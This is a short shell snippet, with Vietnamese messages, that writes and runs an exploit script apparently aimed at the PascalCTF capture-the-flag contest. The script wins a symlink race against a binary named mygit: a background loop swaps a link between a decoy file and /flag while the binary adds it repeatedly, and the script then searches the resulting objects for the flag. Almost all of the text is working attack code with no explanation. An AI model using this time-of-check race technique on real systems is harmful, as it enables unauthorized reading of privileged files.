cat > /tmp/zennis_pwn.sh <<'EOF'
#!/bin/bash

VULN_BIN=/usr/bin/mygit

WORKDIR=/tmp/zennis_exploit
rm -rf $WORKDIR
mkdir -p $WORKDIR
cd $WORKDIR

echo "[*] Khoi tao repo..."
rm -rf .mygit
$VULN_BIN init > /dev/null

echo "[*] Tao file gia..."
touch valid_file

echo "[*] Bat dau dua toc do (RACE)..."

while true; do
    ln -sf valid_file target
    ln -sf /flag target
done &
PID_SWITCH=$!

for i in {1..1000}; do
    $VULN_BIN add target 2>/dev/null
done

kill $PID_SWITCH

echo "[*] Tim kiem FLAG..."
grep -a -r "flag" .mygit/objects/ 2>/dev/null
grep -a -r "PascalCTF" .mygit/objects/ 2>/dev/null

echo "--- NOI DUNG CAC OBJECT TIM DUOC ---"
# In het ra man hinh de ban tu soi
find .mygit/objects -type f ! -name ".*" -exec cat {} +
echo -e "\n---------------------------"
EOF

chmod +x /tmp/zennis_pwn.sh

# 3. Chạy script
/tmp/zennis_pwn.sh